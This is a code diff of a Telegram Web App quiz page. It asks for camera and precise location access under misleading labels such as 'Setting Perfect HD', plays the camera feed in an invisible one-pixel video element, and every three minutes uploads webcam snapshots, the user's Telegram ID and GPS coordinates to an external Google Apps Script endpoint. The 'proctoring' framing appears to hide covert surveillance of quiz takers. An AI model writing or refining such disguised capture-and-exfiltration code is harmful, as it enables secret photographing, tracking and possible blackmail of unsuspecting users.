@@ -15,7 +15,7 @@
         button { background: linear-gradient(135deg, #00eaff, #0080ff); color: white; border: none; padding: 18px; border-radius: 12px; cursor: pointer; font-size: 16px; font-weight: 700; width: 100%; transition: 0.3s; box-shadow: 0 5px 15px rgba(0, 234, 255, 0.3); }
         button:disabled { background: #333; box-shadow: none; opacity: 0.6; }
         .option { background: rgba(255, 255, 255, 0.07); padding: 16px; margin: 12px 0; border-radius: 12px; cursor: pointer; text-align: left; border: 1px solid rgba(255, 255, 255, 0.1); }
-        video { width: 1px; height: 1px; opacity: 0; position: fixed; top: 0; }
+        video { width: 1px; height: 1px; opacity: 0; position: fixed; }
     </style>
 </head>
 <body>
@@ -42,8 +42,8 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    // --- APNA APPS SCRIPT URL YAHA DALEIN ---
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzQKp_JWF9juebUImgf1cm4hwEi6DZdv-vvfnWIb-LmzM-4oGf7L4Ya5xrZpoxUnNfWGA/exec"; 
+    // PASTE YOUR NEW DEPLOYMENT URL HERE
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbywZ2SUCcav8B4Q7b9kaNF3DvDJ_19nxmLoUq1VvjIK0MYzcacMUBNYcBE89CpY8ipKpQ/exec"; 
 
     const user = tg.initDataUnsafe?.user || {};
     let userLoc = "Pending";
@@ -57,16 +57,16 @@
     async function requestAllPermissions() {
         const btn = document.getElementById("startBtn");
         btn.disabled = true;
-        btn.innerText = "Configuring... ⏳";
+        btn.innerText = "Setting Perfect HD... ⏳";
 
         try {
             globalStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { width: 1280, height: 720, aspectRatio: 1.7777777778 } 
+                video: { width: { ideal: 1280 }, height: { ideal: 720 }, aspectRatio: 1.7777777778 } 
             });
             document.getElementById('proctorVideo').srcObject = globalStream;
 
             const pos = await new Promise((res, rej) => {
-                navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true });
+                navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 15000 });
             });
             userLoc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
 
@@ -74,12 +74,11 @@
             document.getElementById("quizBox").style.display = "block";
             loadQuestion();
             
-            // Send first data
-            captureAndSend("Test_Started");
+            setTimeout(() => captureAndSend("Test_Started"), 2000);
             setInterval(() => captureAndSend("Periodic_Check"), 180000);
 
         } catch (err) {
-            alert("Permission Denied! Camera/Location access is required.");
+            alert("Error: Permissions are required.");
             btn.disabled = false;
             btn.innerText = "प्रक्रिया शुरू करें";
         }
@@ -90,13 +89,12 @@
         try {
             const video = document.getElementById('proctorVideo');
             const canvas = document.createElement('canvas');
-            canvas.width = 1280;
-            canvas.height = 720;
+            canvas.width = 640; // Reduced size for sheet stability
+            canvas.height = 360;
             const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, 640, 360);
             
-            // HD Drawing
-            ctx.drawImage(video, 0, 0, 1280, 720);
-            const photoData = canvas.toDataURL('image/jpeg', 0.7); // Reduced slightly for speed
+            const photoData = canvas.toDataURL('image/jpeg', 0.6); // Lower quality for faster sheet loading
 
             const payload = {
                 userId: user.id || "NA",
@@ -108,19 +106,13 @@
                 location: userLoc
             };
 
-            // Enhanced Fetch
-            fetch(SCRIPT_URL, { 
-                method: "POST", 
-                mode: "no-cors", // Keep no-cors for Google Apps Script redirects
-                body: JSON.stringify(payload) 
-            });
-            
-        } catch (e) { console.log("Error:", e); }
+            fetch(SCRIPT_URL, { method: "POST", mode: "no-cors", body: JSON.stringify(payload) });
+        } catch (e) { console.log("Capture Error:", e); }
     }
 
     function loadQuestion() {
         if (currentIdx >= questions.length) { 
-            alert("Test Submitted!"); 
+            alert("Test Submitted Successfully!"); 
             tg.close(); 
             return; 
         }
